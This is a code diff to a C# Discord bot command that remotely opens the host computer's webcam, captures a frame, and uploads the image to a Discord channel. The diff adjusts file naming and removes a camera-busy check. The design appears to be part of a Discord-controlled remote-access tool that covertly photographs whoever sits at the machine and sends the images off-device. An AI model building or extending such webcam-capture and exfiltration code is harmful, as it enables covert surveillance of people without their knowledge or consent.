@@ -23,12 +23,6 @@ public sealed class Camera : Masked.DiscordNet.IDiscordCommand
         await sockCommand.DeferAsync();
         var response = await sockCommand.FollowupAsync("Accessing the Computer's Camera...");
         VideoCapture capture = new();
-
-        if (capture.IsOpened)
-        {
-            await response.ModifyAsync(x => x.Content = "Failed to access camera: Another application had an already opened handle to the camera. Can not continue operation.");
-            return;
-        }
         await response.ModifyAsync(x => x.Content = $"Camera Information:\nCamera Backend: {capture.BackendName}\nResolution {capture.Width!}x{capture.Height!}\nCamera Type: {capture.CaptureSource.ToStringOp()}");
 
         Mat frameRaw = capture.QueryFrame();
@@ -40,7 +34,9 @@ public sealed class Camera : Masked.DiscordNet.IDiscordCommand
         var temporalPath = Path.GetTempFileName();
         await File.WriteAllBytesAsync(temporalPath, frameData);
 
-        await sockCommand.Channel.SendFileAsync(temporalPath, "Webcam Image Attached.");
+        File.Move(temporalPath, temporalPath + ".jpeg");
+
+        await sockCommand.Channel.SendFileAsync(temporalPath + ".jpeg", "Webcam Image Attached.");
 
         // Dispose of EVERYTHING.
         frameAsImage.Dispose();
@@ -48,7 +44,7 @@ public sealed class Camera : Masked.DiscordNet.IDiscordCommand
         capture.Dispose();
 
         // Delete temporal file.
-        File.Delete(temporalPath);
+        File.Delete(temporalPath + ".jpeg");
     }
 
     public SlashCommandProperties Build()
